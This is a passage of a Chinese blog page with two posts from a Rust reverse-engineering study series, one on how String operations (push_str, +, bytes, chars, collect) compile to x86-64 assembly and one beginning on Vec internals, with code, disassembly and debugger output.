              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-string"><a class="markdownIt-Anchor" href="#reverse-for-string"></a> Reverse for String</h1>
<p>上一篇文章简单分析了Vec变长数组的结构，今天来介绍String。实际上Rust的字符串类型对于我们并不陌生，在前面几篇文章的几乎任何一个示例中都可以找到它们。</p>
<p>我们曾经提到过，String类型在栈中占0x18大小，其中包括字符串的指针、字符串长度、字符串容量。看上去好像什么问题都没有，但如果你使用Python或C/C<ins>开发过一些项目，你可能会遇到一些与字符串编码有关的问题。在C</ins>中，由于需要考虑多种字符编码方式，字符被分为char、wchar_t、tchar等等，它们占用的字节数量还不相同，如果需要转换还需要使用特定的函数完成，对于一些需要进行编码转换的场景来说，稍有一个不注意，可能就是一串乱码怼在你的脸上，让人深恶痛绝。</p>
<p>但对于Rust而言，它规定，只要是我Rust写的程序，程序里面的所有字符串全都用UTF-8编码。这样就从根本上杜绝了编码转换的问题。</p>
<p>不过，这也产生了一些问题，其中影响最大的可能就是字符串不可索引了。由于使用UTF-8编码，对于不同的字符，其占用的字节数量可能不同，而Rust又不能将字符串单纯地看做单字节数组，因此Rust无法知道在一个既有中文又有英文又有其他语言的字符串中，第某个有效字符在字符串中的偏移地址到底是多少。对于一个Rust字符串，它的长度指的是占用的内存空间大小，因此对于1个中文字符组成的字符串，它的长度实际上是3。</p>
<p>下面介绍一下Rust中String的常用操作。</p>
<h2 id="push_str-与"><a class="markdownIt-Anchor" href="#push_str-与"></a> <code>push_str</code> 与 <code>+</code></h2>
<p>在Rust中，<code>push_str</code>方法与运算符<code>+</code>都能够将一个字符串拼接到另一个字符串的后面。让我们看一下二者在汇编上有什么区别。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    s += <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">    sub     rsp, <span class="number">152</span></span><br><span class="line">    lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">    lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">    mov     qword ptr [rsp + <span class="number">24</span>], rdi</span><br><span class="line">    mov     edx, <span class="number">5</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">    mov     rdi, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">    lea     rsi, [rip + .L__unnamed_8]</span><br><span class="line">    mov     edx, <span class="number">3</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::ops::arith::AddAssign&lt;&amp;<span class="type">str</span>&gt;&gt;::add_assign</span><br><span class="line">    jmp     .LBB36_3</span><br></pre></td></tr></table></figure>
<p>首先看下<code>+</code>。这里的<code>+</code>运算符实际上是调用了<code>String</code>的方法，<code>String</code>这个结构重载了<code>+</code>这个运算符。这与C++的运算符重载类似。在汇编中，显示出调用的函数为<code>&lt;alloc::string::String as core::ops::arith::AddAssign&lt;&amp;str&gt;&gt;::add_assign</code>。实际上，Rust运算符重载的本质就是对“加”这个操作的Trait的impl，它与Rust中其他Trait并没有太大的区别，只有在使用的时候能够直接用运算符代替显式的方法调用罢了。需要注意的是，使用<code>+</code>运算符或<code>push_str</code>时，参数只能是字符串切片而不能是字符串，这是因为这两个方法不需要获取<code>String</code>的所有权，如果能够传入<code>String</code>，那么在这个函数执行后参数实际上就被销毁了，这当然是不希望看到的。另外，由于有解引用强制转换，我们传入<code>String</code>的引用也是被允许的。</p>
<p>对于上面的示例，一开始的字符串创建时，其指针指向的实际上并不是堆地址空间，而是字符串切片<code>CoLin</code>中保存的字符串常量地址。此时<code>s</code>中的字符串长度与字符串容量相同，均为5。随后使用<code>+</code>运算符增加字符串长度时，由于检测到字符串没有多余容量，因此会在堆空间分配一块更大的空间，将字符串拼接的结果保存到这块空间中，与<code>realloc</code>有相似之处。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    s.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">    sub     rsp, <span class="number">152</span></span><br><span class="line">    lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">    lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">    mov     qword ptr [rsp + <span class="number">24</span>], rdi</span><br><span class="line">    mov     edx, <span class="number">5</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">    mov     rdi, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">    lea     rsi, [rip + .L__unnamed_8]</span><br><span class="line">    mov     edx, <span class="number">3</span></span><br><span class="line">    call    alloc::string::<span class="type">String</span>::push_str</span><br><span class="line">    jmp     .LBB36_3</span><br></pre></td></tr></table></figure>
<p>上面是使用<code>push_str</code>的汇编结果，可以看到只有函数调用发生了改变，甚至二者传入的参数都是一样的，分别是：原来的<code>String</code>栈地址，看做<code>this</code>、字符串指针、字符串长度。</p>
<h2 id="format"><a class="markdownIt-Anchor" href="#format"></a> <code>format!</code></h2>
<p>当需要拼接的字符串较多，或符合某种格式时，使用<code>format!</code>宏是一种更加简洁的方法。对于<code>format!</code>宏，我们实际上已经分析过了，因为<code>println!</code>的前半部分就是<code>format!</code>，也就是<code>core::fmt::Arguments::new_v1</code>方法的调用流程。这个在第一篇文章中已经介绍过了，这里不再赘述。</p>
<h2 id="bytes方法"><a class="markdownIt-Anchor" href="#bytes方法"></a> <code>bytes</code>方法</h2>
<p>这个方法返回的是字符串中的所有字节。不过需要注意的是这个方法返回的是一个不可变借用，除非这个方法的返回值被删除，否则字符串不能修改。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; is &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">bytes</span>();</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">b</span> <span class="keyword">in</span> x&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.LBB27_9:</span><br><span class="line">    mov     rax, qword ptr [rsp + 216]</span><br><span class="line">    mov     qword ptr [rsp + 192], rax</span><br><span class="line">    movups  xmm0, xmmword ptr [rsp + 200]</span><br><span class="line">    movaps  xmmword ptr [rsp + 176], xmm0</span><br><span class="line">    lea     rdi, [rsp + 176]</span><br><span class="line">    call    &lt;alloc::string::String as core::ops::deref::Deref&gt;::deref</span><br><span class="line">    mov     qword ptr [rsp + 64], rdx</span><br><span class="line">    mov     qword ptr [rsp + 72], rax</span><br><span class="line">    jmp     .LBB27_12</span><br><span class="line">    ...</span><br><span class="line">.LBB27_12:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 64]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 72]</span><br><span class="line">    call    core::str::&lt;impl str&gt;::bytes</span><br><span class="line">    mov     qword ptr [rsp + 48], rdx</span><br><span class="line">    mov     qword ptr [rsp + 56], rax</span><br><span class="line">    jmp     .LBB27_13</span><br><span class="line">.LBB27_13:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 48]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 56]</span><br><span class="line">    mov     rax, qword ptr [rip + &lt;I as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     qword ptr [rsp + 32], rdx</span><br><span class="line">    mov     qword ptr [rsp + 40], rax</span><br><span class="line">    jmp     .LBB27_14</span><br><span class="line">.LBB27_14:</span><br><span class="line">    mov     rax, qword ptr [rsp + 32]</span><br><span class="line">    mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">    mov     qword ptr [rsp + 304], rcx</span><br><span class="line">    mov     qword ptr [rsp + 312], rax</span><br><span class="line">.LBB27_15:</span><br><span class="line">    lea     rdi, [rsp + 304]</span><br><span class="line">    call    &lt;core::str::iter::Bytes as core::iter::traits::iterator::Iterator&gt;::next</span><br><span class="line">    mov     byte ptr [rsp + 30], dl</span><br><span class="line">    mov     byte ptr [rsp + 31], al</span><br><span class="line">    jmp     .LBB27_16</span><br></pre></td></tr></table></figure>
<p>可以看到，上面的代码中，首先对<code>String</code>类型进行<code>deref</code>解引用获取字符串切片，然后调用<code>bytes</code>方法，这个方法的第一个参数是字符串指针，第二个参数是字符串长度。这个方法的返回值有两个，<code>rax</code>为字符串开头的地址，<code>rdx</code>为字符串末尾的地址。后面是<code>into_iter</code>方法，这个方法的参数和返回值一样。下面就是正常的迭代器迭代流程，在前面的文章中有分析。</p>
<h2 id="chars方法"><a class="markdownIt-Anchor" href="#chars方法"></a> <code>chars</code>方法</h2>
<p>这个方法返回的是字符串中所有字符的集合。由于字符串中每个字符占用的字节数量可能不同，那么如何表示字符的集合就很值得我们研究了。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;太6了!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">chars</span>();</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">b</span> <span class="keyword">in</span> x&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.LBB27_9:</span><br><span class="line">    mov     rax, qword ptr [rsp + 216]</span><br><span class="line">    mov     qword ptr [rsp + 192], rax</span><br><span class="line">    movups  xmm0, xmmword ptr [rsp + 200]</span><br><span class="line">    movaps  xmmword ptr [rsp + 176], xmm0</span><br><span class="line">    lea     rdi, [rsp + 176]</span><br><span class="line">    call    &lt;alloc::string::String as core::ops::deref::Deref&gt;::deref</span><br><span class="line">    mov     qword ptr [rsp + 64], rdx</span><br><span class="line">    mov     qword ptr [rsp + 72], rax</span><br><span class="line">    jmp     .LBB27_12</span><br><span class="line">    ...</span><br><span class="line">.LBB27_12:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 64]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 72]</span><br><span class="line">    call    core::str::&lt;impl str&gt;::chars</span><br><span class="line">    mov     qword ptr [rsp + 48], rdx</span><br><span class="line">    mov     qword ptr [rsp + 56], rax</span><br><span class="line">    jmp     .LBB27_13</span><br><span class="line">.LBB27_13:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 48]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 56]</span><br><span class="line">    mov     rax, qword ptr [rip + &lt;I as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     qword ptr [rsp + 32], rdx</span><br><span class="line">    mov     qword ptr [rsp + 40], rax</span><br><span class="line">    jmp     .LBB27_14</span><br><span class="line">.LBB27_14:</span><br><span class="line">    mov     rax, qword ptr [rsp + 32]</span><br><span class="line">    mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">    mov     qword ptr [rsp + 304], rcx</span><br><span class="line">    mov     qword ptr [rsp + 312], rax</span><br><span class="line">.LBB27_15:</span><br><span class="line">    lea     rdi, [rsp + 304]</span><br><span class="line">    call    &lt;core::str::iter::Chars as core::iter::traits::iterator::Iterator&gt;::next</span><br><span class="line">    mov     dword ptr [rsp + 28], eax</span><br><span class="line">    jmp     .LBB27_16</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，这里与<code>bytes</code>类似。经过调试发现，<code>chars</code>方法返回的也是两个地址，开始地址和结尾地址。因为<code>chars</code>返回的类型是迭代器，所以Rust可以通过调用<code>next</code>方法动态地判断下一个字符占用的字节数量，因此不需要返回每一个字符占用的字节数。但是，我们有方法让Rust返回<strong>真正的字符数组</strong>，那就是使用<code>collect</code>方法将迭代器转换为<code>Vec</code>：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;太6了!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">chars</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span>: <span class="type">Vec</span>&lt;<span class="type">char</span>&gt; = x.<span class="title function_ invoke__">collect</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5555555b6c00</span><br><span class="line">00:0000│  0x5555555b6c00 ◂— 0x6f00000043 /* &#x27;C&#x27; */</span><br><span class="line">01:0008│  0x5555555b6c08 ◂— 0x690000004c /* &#x27;L&#x27; */</span><br><span class="line">02:0010│  0x5555555b6c10 ◂— 0x200000006e /* &#x27;n&#x27; */</span><br><span class="line">03:0018│  0x5555555b6c18 ◂— 0x360000592a /* &#x27;*Y&#x27; */</span><br><span class="line">04:0020│  0x5555555b6c20 ◂— 0x2100004e86</span><br></pre></td></tr></table></figure>
<p><code>collect</code>方法在一个栈地址中保存了一个堆地址，而这个堆地址的内容就如上面所示。可以看到，Rust为每一个字符分配了4个字节的空间，虽然大多数字符都占不到4个字节，但是为了索引的需要，Rust必须分配一个足够容纳所有字符的空间，也就是UTF-8的一个字符可能占用的最大字节数。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文我们学习了：</p>
<ol>
<li>字符数组在内存中的结构</li>
<li>字符串遍历过程的逆向</li>
<li>Rust字符串的相关知识</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-5/" class="post-title-link" itemprop="url">Rust逆向学习 (5)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-10 20:24:50" itemprop="dateCreated datePublished" datetime="2023-11-10T20:24:50+08:00">2023-11-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-11-11 13:30:27" itemprop="dateModified" datetime="2023-11-11T13:30:27+08:00">2023-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文将对Rust中的通用集合类型——动态数组<code>Vec</code>进行学习，对应参考书中的第8章。</p>
<h1 id="reverse-for-vec"><a class="markdownIt-Anchor" href="#reverse-for-vec"></a> Reverse for Vec</h1>
<p><code>Vec</code>是Rust中的动态数据结构，与C++中的<code>vector</code>功能类似。实际上Rust中的<code>String</code>就是一个特殊的<code>Vec</code>，这可以通过查看Rust的内核代码证实。</p>
<h2 id="vec-与-添加元素"><a class="markdownIt-Anchor" href="#vec-与-添加元素"></a> vec! 与 添加元素</h2>
<p><code>vec!</code>是一个宏，用于快速初始化数组元素。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 168</span><br><span class="line">        mov     edi, 12</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        call    alloc::alloc::exchange_malloc</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        and     rax, 3</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        sete    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB31_1</span><br><span class="line">        jmp     .LBB31_2</span><br><span class="line">.LBB31_1:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 32]</span><br><span class="line">        mov     dword ptr [rsi], 1</span><br><span class="line">        mov     dword ptr [rsi + 4], 2</span><br><span class="line">        mov     dword ptr [rsi + 8], 3</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::slice::&lt;impl [T]&gt;::into_vec@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsp + 24], rdi</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        call    rax</span><br><span class="line">        mov     rdi, qword ptr [rsp + 24]</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::vec::Vec&lt;T,A&gt;::push@GOTPCREL]</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB31_5</span><br></pre></td></tr></table></figure>
<p>第一段中，我们可以发现<code>vec!</code>宏执行时，汇编实际上执行的是什么操作。首先调用了一个<code>exchange_malloc</code>函数，传入第一个参数为12，第二个参数为4，根据源码可以判断出，第一个参数应该是总的内存分配字节数量，第二个参数为每个元素的字节数量。这个函数的返回值是<code>Box&lt;[i32]&gt;</code>，这是Rust中的一个智能指针类型，能够在堆分配内存并管理生命周期，指针保存在栈中。后面对返回值进行了判断，如果内存分配失败则会输出错误信息。Box的特性如下，参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21484461/article/details/131731732?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169961961316800226578680%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169961961316800226578680&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-131731732-null-null.142%5Ev96%5Econtrol&amp;utm_term=Rust%20Box&amp;spm=1018.2226.3001.4187">传送门</a></p>
<blockquote>
<p>在栈上存储指针，指向堆上的数据。<br />
在转移所有权时负责释放堆上的内存。<br />
大小固定，适用于已知大小的类型。<br />
只能有一个所有者，不可共享引用。</p>
</blockquote>
<p>随后，代码中以<code>rsi</code>作为指针，初始化了3个数组元素。初始化完成后调用<code>into_vec</code>将<code>Box</code>转换为<code>Vec</code>类型。可以说，上面源码中的<code>vec!</code>宏基本等同于：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">b</span>: <span class="type">Box</span>&lt;[<span class="type">i32</span>]&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = b.<span class="title function_ invoke__">into_vec</span>();</span><br></pre></td></tr></table></figure>
<p>经过调试发现，调用<code>into_vec</code>后，<code>Vec</code>实例中的指针与<code>Box</code>的指针相同，但现在<code>Box</code>类型已经不复存在了，其所有权已经被转移到<code>Vec</code>中。</p>
<p>随后，程序调用了<code>push</code>方法扩充了<code>Vec</code>的空间，但原先的地址空间不足以容纳新的元素，因此需要将原先的内存空间释放掉再重新分配。考虑到Rust在汇编层调用的是libc，所以堆管理那套本质上还是<code>malloc</code>、<code>free</code>那些函数，与C/C++相同，方便进行分析。</p>
<p>在动态数组大小发生改变时，如果存在一个已有的对某个元素的引用，那么大小改变后该引用可能会指向被释放的空间，这是Rust所不能允许的，这就要回到所有权规则的定义。考虑存在不可变引用的情况，如果此时需要增加数组的长度，那么首先在增加前必然需要获取该动态数组的可变引用，而所有权规则不允许一个实例同时存在可变引用和不可变引用，因此导致编译失败。</p>
<h2 id="元素访问"><a class="markdownIt-Anchor" href="#元素访问"></a> 元素访问</h2>
<p>Rust中有两种方式访问动态数组中的元素，第一种是直接通过下标访问：</p>
